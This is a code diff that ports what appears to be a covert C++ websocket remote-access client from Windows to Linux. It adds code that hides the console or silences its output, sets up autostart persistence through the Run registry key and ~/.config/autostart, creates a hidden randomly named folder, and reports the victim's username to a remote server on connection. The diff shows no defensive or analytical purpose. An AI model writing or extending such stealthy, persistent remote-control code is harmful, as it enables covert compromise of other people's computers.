@@ -7,9 +7,16 @@
 #include <websocketpp/client.hpp>
 #include <boost/asio.hpp>
 #include <boost/process.hpp>
-#include <windows.h>
 #include <random>
 #include <filesystem>
+
+#ifdef _WIN32
+#include <windows.h>
+#else
+#include <unistd.h>
+#include <sys/stat.h>
+#include <fcntl.h>
+#endif
 
 using websocketpp::client;
 using websocketpp::connection_hdl;
@@ -45,11 +52,20 @@ public:
         return result;
     }
 
-    void hideDirectory(const std::string& path) {
-        std::string command = "attrib +h +s \"" + path + "\"";
-        system(command.c_str());
+    void hideShell() {
+#ifdef _WIN32
+        HWND hwnd = GetConsoleWindow();
+        ShowWindow(hwnd, SW_HIDE);
+#else
+        // Linux: Redirect stdout and stderr to /dev/null
+        int devNull = open("/dev/null", O_RDWR);
+        dup2(devNull, STDOUT_FILENO);
+        dup2(devNull, STDERR_FILENO);
+        close(devNull);
+#endif
     }
 
+#ifdef _WIN32
     void addToStartup(const std::string& file_path) {
         HKEY hKey;
         if (RegOpenKeyEx(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
@@ -58,12 +74,37 @@ public:
         }
     }
 
+    void hideDirectory(const std::string& path) {
+        std::string command = "attrib +h +s \"" + path + "\"";
+        system(command.c_str());
+    }
+#else
+    void addToStartup(const std::string& file_path) {
+        std::string command = "cp " + file_path + " ~/.config/autostart/";
+        system(command.c_str());
+    }
+
+    void hideDirectory(const std::string& path) {
+        std::string command = "chattr +h " + path;
+        system(command.c_str());
+    }
+#endif
+
     void run() {
+        hideShell(); // Hide the shell at the start
+
         std::string username = boost::process::system("whoami");
         sendMessage("I'm Connected | Username : " + username);
 
         std::string folder_name = generateRandomString(16);
-        std::string folder_path = "C:\\" + folder_name;
+        std::string folder_path;
+
+#ifdef _WIN32
+        folder_path = "C:\\" + folder_name;
+#else
+        folder_path = "/home/" + folder_name;
+#endif
+
         std::filesystem::create_directory(folder_path);
         hideDirectory(folder_path);
 
@@ -107,4 +148,3 @@ int main() {
     }
     return 0;
 }
-
